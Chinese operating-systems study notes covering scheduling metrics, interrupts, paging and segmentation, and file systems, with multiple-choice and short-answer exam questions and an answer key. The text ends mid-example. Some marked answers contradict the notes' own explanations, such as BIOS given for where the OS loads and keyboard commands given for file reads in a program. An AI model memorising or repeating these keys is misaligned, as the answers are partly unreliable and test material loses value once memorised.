对于用户来说，他们关心自己的单个作业的周转时间，但是对于操作系统来说，操作系统更关心整体表现，于是出现了平均周转时间，即 周转时间的平均值。下面是平均周转时间的计算公式。 平均周转时间&#x3D;各作业周转时间之和&#x2F;作业数目 举个例子：小明去打酱油，他打酱油很快，只需要1分钟。但是到酱油铺后，由于人太多了，小明等了10分钟才轮到自己，这是小明打酱油的经历。现在小红去打醋，她打醋要花10分钟，她到醋铺后只等了1分钟就轮到了自己。我们可以算出他们的周转时间都是11分钟，但是他们的体验感有所不同，小明打酱油1分钟却等了10分钟，他肯定很暴躁。而小红打醋10分钟却只等了1分钟，她觉得这样的体验挺OK的。回到操作系统，类比一下，打酱油和打醋都是作业，小明和小红作为用户。可以看出，他们在周转时间相同的情况下，体验是不一样的。 于是，人们提出了带权周转时间来衡量满意度。公式如下。 带权周转时间&#x3D;作业周转时间 &#x2F; 作业实际运行的时间&#x3D;（作业完成时间点−作业提交时间点）&#x2F;作业实际运行的时间 可以看出，带权周转时间肯定大于等于一，因为作业周转时间包括了作业实际运行的时间。而且，带权周转时间越小，用户满意度越高，反之则越低。例如上面的小明小红，他们的平均周转时间分别是11、1.1。当然，操作系统更关心他们的整体满意度，所以出现了平均带权周转时间，即 带权周转时间的平均值，公式如下。 均带权周转时间&#x3D;各作业带权周转时间之和&#x2F;作业数目 等待时间等待时间&#x3D;周转时间−运行时间 响应时间响应时间，指从用户提交请求到首次产生响应所用的时间。 调度算法：详见： 线程调度：分为：用户级调度和核心级调度 实时调度：实时任务类型：1.根据对截至时间的要求分为：硬实时任务和软实时任务 硬实时任务：指系统必须满足对戒指时间的要求。 软实时任务：任务与预期的截至时间相关联，但不会严格要求。 2.按照任务执行是否有周期性规律分为周期性任务和非周期性任务。 中断中断的概念中断是指程序执行过程中，遇到急需处理的事件时，暂时中止CPU上现行程序的运行，转去执行相应的事件处理程序，待处理完成后再返回原程序被中断处或调度其他程序执行的过程 操作系统是“中断驱动”的；换言之，中断（广义）是激活操作系统的唯一方式 中断有广义和狭义之分，上述中断时指广义的中断 中断源：引起中断的事件或者发出中断请求的来源 中断请求中断源向CPU发出的中断请求 断点发生中断是被打断程序的暂停点 中断系统中断系统是计算机系统中响应和处理中断的系统，包括硬件子系统和软件子系统两部分 中断响应由硬件子系统完成 中断处理由软件子系统完成 中断系统的作用：1.提高主机利用率， 2.及时进行事故处理 3.实现分时操作 4.实现实时操作 5.方便程序调试 中断类型：中断、异常 中断的处理过程：硬件： 终止当前程序的执行，保存断点信息、转到相应的处理程序。 软件： 保存现场，分析原因，处理中断，中断返回。 对中断的处理是在核心态下进行的。 处理机调度的主要目的就是为了分配处理机 引入中级调度的目的：提高内存利用率和吞吐量 作业调度与进程调度之间的差别：作业调度是宏观调度，它所选择的作业只是具有获得处理机的资格，但尚未占有处理机，不能立即在其上实际运行；而进程调度是微观调度，动态地把处理机实际地分配给所选择的进程，使之真正活动起来。另外，进程调度相当频繁，而作业调度执行的次数一般很少。 作业调度从外存的后备队列中选择一批作业调入内存，为它们创建进程，这些进程被送入就绪队列。进程调度从就绪队列中选出一个进程来，并把它的状态改为运行态，把CPU分配给它。当运行进程要等待某一事件时，就让出CPU，进入相应的阻塞队列，并进行进程调度。运行进程完成后，由作业调度进行善后处理工作。 第五章：存储管理逻辑地址：应用程序编译后每个模块都以0地址开始编址，这种地址称为逻辑地址或相对地址 物理地址：内存中各物理存储单元都以同一个基地址开始编址，这种地址称为物理地址或绝对地址 重定位：解决逻辑地址和物理地址之间的映射关系 静态重定位：在程序装入内存时进行地址转换。由装入程序执行，早期小型 OS 使用。 动态重定位：在 CPU 执行程序时进行地址转换，依赖硬件来进行转换。如果不用硬件，效率会极大地下降。 分区法：固定分区法：内存中分区个数不变，各个分区大小固定 缺点：浪费严重，碎片化多 动态分区法：各个分区在相应进程建立时才分配，使其大小正好是进程大小 缺点：一段时间后碎片化严重 处理碎片问题：紧缩把所有的碎片连成一片连续的空闲区（通过移动已分区的内容），可以很好解决碎片化，但是需要读写大量分区中信息，耗费大量CPU时间，时间成本高 分页管理解决动态分区法碎片利用率问题 分页存储管理将进程的逻辑地址分为若干页。对每个页进行编号，从0开始，如：第0页，第1页。相应的，把内存中的物理地址分为若干块，同时对他们进行编号，如0#，1#等。在内存分配时，以块为单位，将若干页面分别装入多个不相邻的物理块中。由于进程的最后一页经常装不满，就形成了不可利用的碎片，称为“页面碎片” 分页地址中地址结构如下： 页表在分页系统中，为了保证进程可以在内存中找到每个页面对应的物理块，系统为每一个进程建立了一张页面映像表，简称页表。在进程地址空间内的所有页，依次在页表中有一页表项，其中记录了相应页在内存对应的物理块号。如下图： 页表解决了块外碎片问题，但减低了性能，页面大小制约因素（太大块内碎片，浪费；太小页表项多，查询时间成本大），所以还要优化——》分段技术 例题15： 分段管理：解决了编译后出现多个0地址 在分段存储管理方式中，作业的地址空间被划分为若干个段，每个段定义了一组逻辑信息。例如，有主程序段MAIN、子程序段X、数据段D及栈段S等，通常，用段号代替段名。每个段都从0开始编址，并采用一段连续的地址空间。 段的长度由相应的逻辑信息组的长度决定，因此每个短对长度并不相等。 分段地址中地址具有的结构 段表 段页式存储管理方式分页系统以页面作为内存分配的基本单位，能够有效提高内存的利用率，而分段系统以段作为内存分配的基本单位，它能够更好的满足用户多方面的需求。而段页式系统这很好的集两者之长。 段页式系统的基本原理是分段和分页原理的结合，即先将用户程序分为若干段，再把系统分为若干页，为每一个段分配一个段明。 段页地址结构包括三部分：段号，段内页号，页内地址 1.等分内存 2.进程的地址空间采用分段方式，将每段再划分为若干页，页面的大小与内存块相同，每段的每个页面都从0开始编址 段表的内容和分段系统不同，它还包括页表大小和页内始址，下图就是利用段表进行从逻辑地址到物理地址的转变 存储管理的基本模式： 单连续存储管理 段式存储管理 页式存储管理 段页式存储管理 第六章：文件系统文件： 是被命名的数据的集合体，是由操作系统定义和执行的抽象数据 文件系统功能：文件管理、目录管理、文件存储空间管理、文件共享和保护、提供方便的用户接口 两种形式的结构 ① 文件的逻辑结构，这是从用户观点出发所观察到的文件组织形式，是用户可以直接处理的数据及其结构，独立于文件的物理特性，又称为文件组织。 ② 文件的物理结构，又称为文件的存储结构，是指文件在外存上的存储组织形式，不仅与存储介质有关，还与外存分配方式有关。 什么是虚拟存储器？它有哪些基本特征？是用户能作为可编址内存对待的虚拟存储空间，它使用户逻辑存储器与物理存储器分离 题目：1.用户可以通过( B) 两种方式来使用计算机。A.命令接口和函数B.命令接口和系统调用C.命令接口和文件管理D.设备管理方式和系统调用 备注： 易懵概念和常见问法:系统调用&#x3D;系统调用命令&#x3D;广义指令操作系统提供给用户直接(间接)使用的接口是?—-&gt;命令接口(程序接口&#x2F;系统调用)操作系统提供给编程人员&#x2F;应用程序使用的接口是?—-&gt;程序接口&#x2F;系统调用 2.系统调用是由操作系统提供给用户的，它(B ) 。A.直接通过键盘交互方式使用B.只能通过用户程序间接使用C.是命令接口中的命令D.与系统的命令一样 系统调用:由操作系统实现的所有系统调用所构成的集合即程序接口或应用编程接口。是应用程序同系统之间的接口。 3.系统调用的目的是(A）A.请求系统服务B.中止系统服务C.申请系统资源D.释放系统资源 4.用户在程序中试图读某文件的第100个逻辑块，使用操作系统提供的(B ) 接口。A.系统调用B.键盘命令C.原语D.图形用户接口 逻辑块:内存块&gt;计算机资源读: I&#x2F;O操作,核心态服务题目转换为→用户在程序中要访问一部分计算机资源，并且需要进入核心态使用内核服务,需要使用操作系统() 接口 5.操作系统与用户通信接口通常不包括(）A. shellB.命令解释器C.广义指令D.缓存管理指令 Shell属于命令解析器，属于命令接口广 义指令就是系统调用指令 系统中的缓存，全部由操作系统管理,对用户是透明的，操作系统不提供管理系统缓存的系统调用。 6.下列选项中， 不属于多道程序设计的基本特征是( C) 。A.制约性B.间断性C.顺序性D.共享性 7.计算机开机后，操作系统最终被加载到( A) 。[2013年计算机联考真题]A. BIOSB. ROMC. EPROMD. RAM RAM:随机访问存储器( random-access memory的缩写)特征:可随机读写，读写速度快，断电后数据消失。ROM:只读存储器(read only memory)特征:数据写入之后不可更改，即使断电数据也不消失。EPROM:电可编程序只读存储器(Electrically Programmable Read- Only- Memory)，-种特殊的ROM。BIOS: Basic Input Output System 基本输入输出系统 例子:为一个裸机安装操作系统Step 1:一般要先进入BIOS系统，选择安装模式(CD或U盘? )Step 2:安装系统的过程，其实是将操作系统相关数据写入硬盘的过程_(C盘)Step 3:安装完毕，正常开机启动。操作系统相关数据从硬盘加载到RAM中，才能被CPU处理 裸机里有什么?裸机的主板.上有ROM、有RAM、有空空如也的硬盘。一台裸机只有RON中有数据，因此BIOS-定是存在ROM中 8.批处理系统的主要缺点是( D) 。A.系统吞吐量小B. CPU利用率不高C.资源利用率低D.无交互能力 单道批处理系统：单道性、顺序性、自动性 多道批处理系统：制约性、多道、间断性、宏观上并行、微观上串行 9.操作系统的基本类型主要有(B )。A.批处理操作系统、分时操作系统和多任务系统B.批处理操作系统、分时操作系统和实时操作系统C.单用户系统、多用户系统和批处理操作系统D.实时操作系统、分时操作系统和多用户系统 10.下列关于批处理系统的叙述中，正确的是(A )。I.批处理系统允许多个用户与计算机直接交互II.批处理系统分为单道批处理系统和多道批处理系统I.中断技术使得多道批处理系统和I&#x2F;O设备可与CPU并行工作A.仅I、IIIB.仅I|C.仅I、IID.仅1、III 11.与单道程序系统相比，多道程序系统的优点是( D) 。I . CPU利用率高II.系统开销小III.系统吞吐量大IV. I&#x2F;O设备利用率高A.仅I、IIIB.仅I、IVC.仅II、IIID.仅I、III、IV单道程序系统:内存中最多只有-道作业，作业之间是串行执行的。若当前作业等待I&#x2F;O，则CPU闲置等待。多道程序系统:内存中有多道作业，作业之间并发执行。若当前作业等待I&#x2F;O，则CPU转 而处理另一道作业。CPU利用率: CPU“忙” 的时间所占的比例系统开销:除了处理作业之外，系统在进程、内存等管理上消耗的时间系统吞吐量:单位时间内CPU完成作业数量 （相同作业下，总耗时越少，吞吐量越大）I&#x2F;0设备利用率: I&#x2F;0设 备”忙”的时间所占的比例 eg： 作业A: CPU 5ms –&gt; I&#x2F;0 5ms –&gt; CPU 5ms –&gt; I&#x2F;O 5ms作业B: CPU 5ms –&gt; I&#x2F;0 5ms – CPU 5ms –&gt; 1&#x2F;0 5ms 单道： 完成2个作业，总耗时40ms， CPU利用 率&#x3D;20&#x2F;40&#x3D;50%，&#x2F;0设备利用率&#x3D;20&#x2F;40&#x3D;50% 多道： 完成2个作业，总耗时25ms，CPU利用率&#x3D;20&#x2F;25&#x3D;80%，&#x2F;0设备利用率&#x3D;20&#x2F;25&#x3D;80% 12.实时操作系统必须在( B) 内处理来自外部的事件。A.一个机器周期B.被控制对象规定时间C.周转时间D.时间片 实时操作系统:是指当外界事件或数据产生时，能够接受并以足够快的速度予以处理，其处理的结果又能在规定的时间之内来控制生产过程或对处理系统做出快速响应，并控制所有实时任务协调-致运行的操作系统。产生目的:为了能在某个时间限制内完成某些紧急任务而不需要时间片排队 13.实时系统的进程调度，通常采用( C) 算法。A.先来先服务B.时间片轮转C.抢占式的优先级高者优先D.高响应比优先 实时操作系统:将时间作为关键参数。系统必须能足够及时地处理某些紧急的外部事件。Key:响应比&#x3D; (等待的时间+要求服务的时间) &#x2F;要求服务的时间eg:进程A要求服务5秒，进程B要求服务10秒，且进程B更重要。若两进程同时到达，则等待10秒之后:进程A响应比&#x3D;3，进程B响应比&#x3D;2。处理顺序: 进程A-&gt;进程B 这种情况下A会先处理，不符合. 先来先服务:早期的单道批处理系统时间片轮转:分时操作系统抢占式的优先级高者优先:实时操作系统高响应比优先:常用于多道程序系统中的作业调度 14.分时系统的一个重要性能是系统的响应时间,对操作系统(C ) 因素进行改进有利于改善系统的响应时间。A.加大时间片B.采用静态页式管理C.优先级+非抢占式调度算法D.代码可重入 分时操作系统的工作方式: -台主机连接了若干个终端，每个终端有一个用户在使用。用户交互式地向系统提出命令请求，系统接受每个用户的命令,采用时间片轮转方式处理服务请求,并通过交互方式在终端上向用户显示结果 响应时间:从用户提交请求到系统首次产生响应所用的时间 16 虚拟存储技术是（A）。A. 补充内存物理空间不足的技术 B. 补充相对地址空间的技术 C. 扩充外存空间的技术 D. 扩充输入输出缓冲区的技术 17.段页式存储管理汲取了页式管理和段式管理的长处，其实现原理结合了页式和段式管理的基本思想，即（B）。A. 用分段方法来分配和管理物理存储空间，用分页方法来管理用户地址空间。 ​ B. 用分段方法来分配和管理用户地址空间，用分页方法来管理物理存储空间。 ​ C. 用分段方法来分配和管理主存空间，用分页方法来管理辅存空间。 ​ D. 用分段方法来分配和管理辅存空间，用分页方法来管理主存空间。 18.（B）是指将作业不需要或暂时不需要的部分移到外存，让出内存空间以调入其他所需数据。​ A. 覆盖技术 B. 交换技术 ​ C. 虚拟技术 D. 物理扩充 19.通道是一种（C）。A. I&#x2F;O端口 B. 数据通道 C. I&#x2F;O专用处理机 D. 软件工具 1.下面各项中， (C ) 不是引入操作系统的最主要目的。A.方便用户使用 B.更有效地利用软.硬件资源 C.及时响应用户请求 D.改善系统性能 2.分时系统响应时间与( D)有关。A.每个应用进程分配的时间片长度 B.进程大小 C.就绪进程数目 D.就绪进程数目和时间片长度 3.采用多道程序设计能( B )。A.增加平均周转时间 B.发挥并提高并行工作能力 C.缩短每道程序的执行时间 D.降低对处理器调度的要求 4.下面对进程的描述中，错误的是( D )。 A.进程是动态的概念 B.进程执行需要处理机 C.进程是有生命期的 D.进程是指令的集合 5.多道程序系统中，当( B )时，进程从执行状态转变为就绪状态。A.进程被进程调度程序选中 B.时间片到 C.等待某一事件 D.等待的事件发生 6.下列选项中，导致创建新进程的操作是( C )。I 用户登录成功 II 设备分配 III启动程序执行 A.仅I和II B.仅II和III C.仅I和III D.I II和III 7.下列因素中，( C )不一定是引起进程调度的因素。 A.一个进程运行完毕 B.运行进程被阻塞 C.一个高优先级进程被创建 D.实时调度中，一个紧迫的任务到来 8.一种既有利于短小作业又兼顾到长作业的作业调度算法是( C )。A.先来先服务 B.轮转 C.最高响应比优先 D.均衡调度 9. “死锁”问题的讨论是针对( D )的。A.某个进程申请系统中不存在的资源 B.某个进程申请资源数超过了系统拥有的最大资源数 C.硬件故障 D.多个并发进程竞争独占型资源 10.采用资源剥夺法可以解除死锁，还可以采用(B )方法解除死锁。A.执行并行操作 B.撤消进程 C.拒绝分配新资源 D.修改信号量 11.下列对重定位的叙述中，正确的选项是( B )。A.经过静态重定位后，指令代码并不发生变化 B.经过静态重定位后，数据地址和指令地址发生了变化 C.经过动态重定位后，数据地址和指令地址都发生了变化 D.经过动态重定位后，数据地址发生了变化而指令地址没有发生变化 12.将主存空闲区按地址顺序从小到大登记在空闲区表中，每次分配时总是顺序查找空闲区表，此种分配算法称为( A)分配算法。A.最先适应 B.最优适应 C.最坏适应 D.随机适应 13.某系统采用页式存储管理策略，拥有逻辑地址空间32页，每页2K，拥有物理空间1M，进程的页表有（ B）项A.16 B.32 C.48 D.96 14.在段式存储管理的地址转换时，若段内地址大于段表中该段的长度，则发生（ D）。A.缺页中断 B.溢出中断 C.硬件故障中断 D.地址越界中断 15.在I&#x2F;O设备控制的发展过程中，最主要的推动因素是( C )。A.提高资源利用率 B.提高系统吞吐量 C.减少主机对I&#x2F;O控制的干预 D.提高CPU与I&#x2F;O设备的并行操作程度 16.用户程序发出磁盘I&#x2F;O请求后，系统的正确处理流程是( B)。A.用户程序→系统调用处理程序→中断处理程序→设备驱动程序 B.用户程序→系统调用处理程序→设备驱动程序→中断处理程序 C.用户程序→设备驱动程序→系统调用处理程序→中断处理程序 D.用户程序→设备驱动程序→中断处理程序→系统调用处理程序 17.逻辑文件的组织结构是由( C )确定的。A.操作系统 B.存储容量 C.用户 D.文件长度 18.在文件的物理结构中，( A )结构不利于文件长度的动态增长。A.顺序 B.链接 C.索引 D.Hash 19.文件系统中文件被按照名字存取是为了（ B ）。A.方便操作系统对信息的管理 B.方便用户的使用 C.确定文件的存取权限 D.加强对文件内容的保密 20.设文件F1当前引用计数值为1，先建立F1的符号链接(软链接)文件F2，再建立F1的硬软链接文件F3，然后删除F1。此时，F2和F3的引用计数值分别是（B ）。A.0，1 B.1，1 C.1，2 D.2，1 21.多道批处理系统的主要缺点是(C )。 A.CPU利用率低 B.不能并发执行 C.缺少交互性 D.以上都不是 22.下列选项中，操作系统提供给应用程序的接口是( A ) 。 A.系统调用 B.中断 C.库函数 D.原语 23.多道程序设计是指(C )。A.在多台处理机上同时执行多道程序 B.在多台处理机上同一时刻执行多道程序 C.在一台处理机上同时执行多道程序 D.在一台处理机上同一时刻执行多道程序 24.有关进程的下列叙述中，(D )是正确的。A.进程是静态的文本 B.进程与程序是一一对应的 C.进程与作业是一一对应的 D.多个进程可以在单个CPU上同时执行 25.下列的进程状态变化中，( C )的变化是不可能发生的。A.运行→就绪 B.运行→等待 C.等待→运行 D.等待→就绪 26.下面所述步骤中，( A )不是创建进程所必需的。 A.由调度程序为进程分配CPU B.建立一个进程控制块 C.为进程分配内存 D.将进程控制块链入就绪队列 27.下列各项中，不是进程调度时机的是( D)。A.现运行的进程正常结束或异常结束 B.现运行的进程从运行态进入就绪态 C.现运行的进程从运行态进入等待态 D.有一进程从等待态进入就绪态 28.在作业调度中，排队等待时间最长的作业被优先调度，这是指( A )调度算法。A.先来先服务 B.短作业优先 C.响应比高优先 D.优先级 29.产生死锁的原因与( D )有关。A.与多个进程竞争CPU B.与多个进程释放资源 C.仅由于并发进程的执行速度不当 D.除资源分配策略不当外，也与并发进程执行速度不当 30.某计算机系统中有8台打印机，有k个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的k的最小值是( C )。(最坏情况每bai个进程du卡2台，4个进程全部卡zhi死) A.2 B.3 C.4 D.5 31.在虚拟内存管理中，地址变换机构将逻辑地址变换为物理地址，形成该逻辑地址的阶段是( B )。A.编辑 B.编译 C.连接 D.装载 32.在系统运行时，对于固定分区的存储管理方式，内存中能并发执行的作业的最大数量是( )。A.用户确定的 B.可变的 C.不受限制的 D.固定的 33.在操作系统的存储管理中，页式分配是（ A ）。A.把程序的逻辑空间和内存的物理空间按同样的尺寸分成若干页 B.把作业按其所需空间分成若干页 C.将内存的空闲空间分成若干页 D.随机地将每个作业的地址空间分成大小相同的若干页 34.在段式存储管理中，下列哪个说法是正确的（ A ）。A.以段为单位分配，每一段是一个连续存储区 B.段与段之间必定不连续 C.段与段之间必定连续 D.每段是等长的 35.I&#x2F;O系统硬件结构分为4级：①设备控制器；②I&#x2F;O设备；③计算机；④I&#x2F;O通道。按级别由高到低的顺序是( D)。A.②-④-①-③ B.③-①-④-② C.②-①-④-③ D.③-④-①-② 36.I&#x2F;O软件一般分为4个层次：用户层、与设备无关软件层、设备驱动程序、中断处理程序。以下工作中，不是由设备驱动程序完成的是( C )。A.向设备寄存器写命令 B.检查用户是否有权使用设备 C.将二进制整数转换成ASCII码以便打印 D.解释用户的I&#x2F;O请求，并将该请求转化为具体的I&#x2F;O操作 37.以下关于文件组织结构的说法中，错误的是( C )。A.文件组织从用户和文件系统的不同角度出发分为逻辑文件和物理文件 B.逻辑文件是用户概念中的文件，分为流式文件和记录式文件 C.磁带文件的物理组织方式一般可以采用顺序结构或链接结构 D.磁盘文件的物理组织方式一般可以采用顺序结构、链接结构或索引结构等 38.采用直接存取（随机存取）方法来读写磁盘上的物理记录时，效率最低的是(C ) 。A.连续结构文件 B.索引结构文件 C.隐式链接结构文件 D.显式链接结构文件 39.文件系统采用多级目录结构可以（B ）。A.节省存储空间 B.解决命名冲突 C.缩短文件传送时间 D.减少系统开销 40.以下（ B ）不是磁盘存储空间的常用管理方法。A.位示图 B.记录的成组操作 C.空闲块表 D.空闲块链 41.从用户的观点看，操作系统是( A)。A.用户与计算机之间的接口 B.控制和管理计算机系统的资源 C.合理组织计算机工作流程 D.一个大型的工具软件 42.下列选项中，在用户态执行的是(A ) 。A.命令解释程序 B.缺页处理程序 C.进程调度程序 D.时钟中断处理程序 43.在计算机系统中，允许多个程序同时进入内存并运行，这种方法称为( D )。A.SPOOLing技术 B.虚拟存储技术 C.缓冲技术 D.多道程序设计技术 44.一个进程是( C )。A.由协处理器执行的一个程序 B.一个独立的程序 + 数据集 C.PCB结构.程序和数据的集合 D.一个独立的程序 45.如果单CPU系统中有n个并发进程，则就绪队列中进程个数最多可达(B )个。A.n B.n-1 C.n-2 D.1 46.通常，用户进程被建立后，( B )。 A.便一直存在于系统中，直到被操作人员撒消 B.随着作业运行正常或不正常结束而撒消 C.随着时间片轮转而撒消与建立 D.随着进程的阻塞或唤醒而撒消与建立 47.支持多道程序设计的操作系统在运行过程中，不断地选择新进程运行来实现CPU的共享，下列选项中，(D )不是引起操作系统选择新进程的直接原因。A.运行进程的时间片用完 B.运行进程出错 C.运行进程要等待某一时件发生 D.有新进程进入就绪状态 48.分时系统中进程调度算法通常采用( B )。A.响应比高者优先 B.时间片轮转法 C.先来先服务 D.短作业优先 49.在操作系统中，所谓“死锁”是指( B )。A.程序死循环 B.多个进程彼此等待资源而不能前进的状态 C.硬件故障 D.时间片太短，进程的调进调出太频繁而效率太低 50.在多进程的并发系统中，肯定不会因竞争( D)而产生死锁。A.打印机 B.磁带机 C.磁盘 D.CPU 51.把目标程序中的逻辑地址转换成主存空间的物理地址称为( B)。A.存储分配 B.地址重定位 C.地址保护 D.程序移动 52.在下述存储管理方案中，( D )管理方式要求作业的逻辑地址与占有主存的存储区域都是连续的。A.段页式 B.页式 C.段式 D.可变分区 53.页式存储管理中，每次从主存中取指令或取操作数，当读快表失败时，要读（B ）次主存。A.1 B.2 C.3 D.4 54.采用段页式存储管理，在CPU中应设置（ A）寄存器。A.段表和页表控制 B.段表控制 C.页表控制 D.界地址 55.硬件采用了中断和通道技术，使得( B )。 A.CPU与外设能紧密结合 B.CPU与外设能并行工作 C.CPU速度提高 D.外设速度提高 56.程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识符是(A )。A.逻辑设备名 B.物理设备名 C.主设备号 D.从设备号 57.下列选项中，( B )不是删除文件所需要完成的工作。A.释放文件所占用的存储空间 B.对文件原占用的存储单元全部清零 C.删除该文件的目录项，即文件控制块(FCB) D.若文件为共享文件，还要对共享设置进行处理 58.下列文件物理结构中，适合随机访问且易于文件扩展的是( B )。A.连续结构 B.索引结构 C.链式结构且磁盘块定长 D.链式结构且磁盘块变长 59.不包含在文件控制块（又称文件目录项）中的信息是 （AA ）。A.存储介质标志 B.文件名 C.存取控制信息 D.文件的物理结构 60.某操作系统的文件系统中，采用3个字节表示磁盘块号，每个磁盘块大小为512字节。该系统中每个（逻辑）磁盘允许的最大容量是（ C ）字节。A.2G B.4G C.8G D.16G 答案：1.C 2.D 3.B 4.D 5.B 6.C 7.C 8.C 9.D 10.B 11.B 12.A 13.B 14.D 15.C 16.B 17.C 18.A 19.B 20.B 21.C 22.A 23.C 24.D 25.C 26.A 27.D 28.A 29.D 30.C 31.B 32.D 33.A 34.A 35.D 36.C 37.C 38.C 39.B 40.B 41.A 42.A 43.D 44.C 45.B 46.B 47.D 48.B 49.B 50.D 51.B 52.D 53.B 54.A 55.B 56.A 57.B 58.B 59.A 60.C 1、试说明进程在三个基本状态之间转换的典型原因。答案：（1）就绪状态→执行状态：进程分配到CPU资源 （2）执行状态→就绪状态：时间片用完 （3）执行状态→阻塞状态：I&#x2F;O请求 （4）阻塞状态→就绪状态：I&#x2F;O完成 2、什么是基于顺序搜索的动态分区分配算法？它可分为哪几种？答案：为了实现动态分区式分配，将系统中的空闲分区组织成空闲分区表或空闲分区链。所谓顺序搜索，是指按表或链的组织顺序，检索表或链上记录的空闲分区，去寻找一个最符合算法的、大小能满足要求的分区。 分区存储管理中常采用的分配策略有：首次适应算法、循环首次适应算法、最佳适应算法、最坏适应算法。 3、试说明低级调度的主要功能。答案：（1）保存处理机的现场信息（2）按某种算法选取进程（3）把处理机分配给进程。 4、试从动态性，并发性和独立性上比较进程和程序?答案：(1)动态性是进程最基本的特性，表现为由创建而产生，由调度而执行，因得不到资源而暂停执行，由撤销而消亡。进程有一定的生命期，而程序只是一组有序的指令集合，是静态实体。 (2)并发性是进程的重要特征，同时也是OS 的重要特征。引入进程的目的正是为了使其程序能和其它进程的程序并发执行，而程序是不能并发执行的。 (3)独立性是指进程实体是一个能独立运行的基本单位，也是系统中独立获得资源和独立调度的基本单位。对于未建立任何进程的程序，不能作为独立单位参加运行。 5、实现虚拟存储器需要哪些硬件支持？答案： （1）请求分页（段）的页（段）表机制 （2）缺页（段）中断机构 （3）地址变换机构 6、引入缓冲的主要原因是什么？答案： 缓和CPU与I&#x2F;O设备之间速度不匹配的矛盾； 减少对CPU的中断频率； 放宽对中断响应时间的限制； 解决数据力度不匹配的问题； 提高CPU和I&#x2F;O设备之间的并行性。 7、处理机管理有哪些主要功能？其主要任务是什么？答案：处理机管理的主要功能是：进程管理、进程同步、进程通信和处理机调度； 进程管理：为作业创建进程，撤销已结束进程，控制进程在运行过程中的状态转换。 进程同步：为多个进程（含线程）的运行进行协调。进程 通信：用来实现在相互合作的进程之间的信息交换。 处理机调度： （1）作业调度。从后备队里按照一定的算法，选出若干个作业，为他们分配运行所需的资源。（2）进程调度：从进程的就绪队列中，按照一定算法选出一个进程，把处理机分配给 它，并设臵运行现场，使进程投入执行。 8、虚拟存储器有哪些特征？其中最本质的特征是什么？答案：虚拟存储器有多次性、对换性、虚拟性三大特征。最本质的特征是虚拟性。 9、文件系统的模型 可分为三层，试说明其每一层所包含的基本内容。答案：第一层：对象及其属性说明（文件、目录、硬盘或磁带存储空间）； 第二层：对对象操纵和管理的软件集合（I&#x2F;O控制层即设备驱动程序、基本文件系统即物理I&#x2F;O层、基本I&#x2F;O管理程序或文件组织模块层、逻辑文件系统层） 第三层：文件系统接口（命令接口&#x2F;图形化用户接口与程序接口）。 10、文件管理有哪些主要功能？其主要任务是什么？答案：文件管理主要功能：文件存储空间的管理、目录管理、文件的读（写）管理和保护。 文件管理的主要任务：管理用户文件和系统文件，方便用户使用，保证文件安全性。 11、试从调度性、并发性、拥有资源性及系统开销方面对进程和线程进行比较。答案： a. 调度性。在传统的操作系统中，拥有资源的基本单位和独立调度、分派的基本单位都是进程，在引入线程的OS中，则把线程作为调度和分派的基本单位，而把进程作为资源拥有的基本单位； b. 并发性。在引入线程的OS中，不仅进程之间可以并发执行，而且在一个进程中的多个线程之间，亦可并发执行，因而使OS具有更好的并发性； c. 拥有资源。无论是传统的操作系统，还是引入了线程的操作系统，进程始终是拥有资源的一个基本单位，而线程除了拥有一点在运行时必不可少的资源外，本身基本不拥有系统资源，但它可以访问其隶属进程的资源； d. 开销。由于创建或撤销进程时，系统都要为之分配和回收资源，如内存空间等，进程切换时所要保存和设置的现场信息也要明显地多于线程，因此，操作系统在创建、撤消和切换进程时所付出的开销将显著地大于线程。 12、与文件系统有关的软件可分为哪几个层次？答案：一般地，把与文件系统有关的软件分为四个层次： I&#x2F;O控制层，是文件系统的最低层，主要由磁盘驱动程序等组成，也可成为设备驱动程序层 基本文件系统层，主要用于处理内存与磁盘之间数据块的交换。 基本I&#x2F;O管理程序，该层用于完成与磁盘I&#x2F;O有关的事务，如将文件逻辑块号转换为物理块号，管理磁盘中的空闲盘块，I&#x2F;O缓冲的指定等。 逻辑文件系统，用于处理与记录和文件相关的操作，如允许用户和应用程序使用符号文件名访问文件及记录，实现对文件的记录和保护等。 13.简述操作系统的基本特征和功能。答：基本特征：并发、共享、异步、虚拟。 功能：处理机管理、存储器管理、设备管理、文件管理、用户接口。 14.试比较进程与程序的差异。答：（1）程序是一个静态概念，而进程是一个动态概念，是程序的一次执行； （2）进程具有并行特性，而程序没有； （3）进程和程序不是一一对应的，一个程序可对应多个进程；一个进程可以执行一个或几个程序。 某进程调度程序采用基于优先数(priority)的调度策略，即选择优先数最小的进程运行，进程创建时由用户指定一个nice作为静态优先数。为了动态调整优先数，引入运行时间cpuTime和等待时间waitTime，初值均为0。进程处于执行态时，cpuTime定时加1，且waitTime置0；进程处于就绪态时，cpuTime置0，waitTime定时加1。请回答下列问题。 (1)若调度程序只将nice的值作为进程的优先数，即priority&#x3D;nice，则可能会出现饥饿现象，为什么? (2)使用nice、cpuTime和waitTime设计一种动态优先数计算方法，以避免产生饥饿现象，并说明waitTime的作用。 答：（1）由于采用了静态优先数，当就绪队列中总有优先数较小的进程时，优先数较大的进程一直没有机会运行，因而会出现饥饿现象。 （2）优先数的计算公式为： priority&#x3D;nice+k1cpuTime- k2waitTime,其中k1&gt;0, k2&gt;0。waitTime可使长时间等待的进程的优先数减少。 SPOOLing系统由哪几部分组成？以打印机为例说明如何利用SPOOLing技术实现多个进程对打印机的 答 组成：(1)输入井和输出井,(2)输入和输出缓冲区,(3)输入(收容)进程SPi 和输出(提取)进程Spo。 当用户进程请求打印输出时， SPOOLing系统同意为它打印输出， 但并不真正立即把打印机分配给该用户进程， 而只为它做两件事： ① 由输出进程在输出井中为之申请一个空闲磁盘块区， 并将要打印的数据送入其中； ② 输出进程再为用户进程申请一张空白的用户请求打印表，并将用户的打印要求填入其中， 再将该表挂到请求打印队列上。 当打印机空闲，输出进程将从请求打印队列的对首取出一张请求打印表，根据表中的要求将打印的数据从输出井传送到内存缓冲区，再由打印机打印….。 20.一个例子的形式讲解逻辑地址到物理地址的转换：某虚拟存储器的用户编程空间共32个页面，每页为1KB，内存为16KB。假定某时刻一用户页表中已调入内存的页面的页号和物理块号的对照表如下： 页号 物理块号 0 3 1 7 2 11 3 8 则逻辑地址0A5C(H)所对应的物理地址是什么？要求：写出主要计算过程。 ****解题过程****： ​ 首先要知道页式存储管理的逻辑地址分为两部分：页号和页内地址。物理地址分为两部分： 关系为：逻辑地址＝ 页号＋页内地址 ​ 物理地址＝ 块号＋页内地址； 